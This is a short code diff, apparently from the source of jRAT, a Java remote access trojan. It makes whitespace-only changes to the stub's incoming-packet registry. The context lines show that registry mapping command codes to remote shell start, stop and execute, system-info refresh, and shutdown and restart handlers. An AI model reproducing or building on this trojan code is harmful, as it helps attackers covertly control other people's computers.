@@ -7,7 +7,6 @@ import pro.jrat.common.PacketRange;
 import pro.jrat.common.exceptions.PacketException;
 import pro.jrat.stub.Plugin;
 
-
 public abstract class AbstractIncomingPacket {
 
 	public static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();
@@ -30,7 +29,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put(/* "RUNCMD" */(byte) 23, Packet23RemoteShellStart.class);
 		incomingPackets.put(/* "ENDCMD" */(byte) 24, Packet24RemoteShellStop.class);
 		incomingPackets.put(/* "EXEC" */(byte) 25, Packet25RemoteShellExecute.class);
-		// TODO 26 free 
+		// TODO 26 free
 		incomingPackets.put(/* "REFRESHINFO" */(byte) 27, Packet27RefreshSystemInfo.class);
 		incomingPackets.put(/* "SHUTDOWN" */(byte) 28, Packet28ShutdownComputer.class);
 		incomingPackets.put(/* "RESTART" */(byte) 29, Packet29RestartComputer.class);
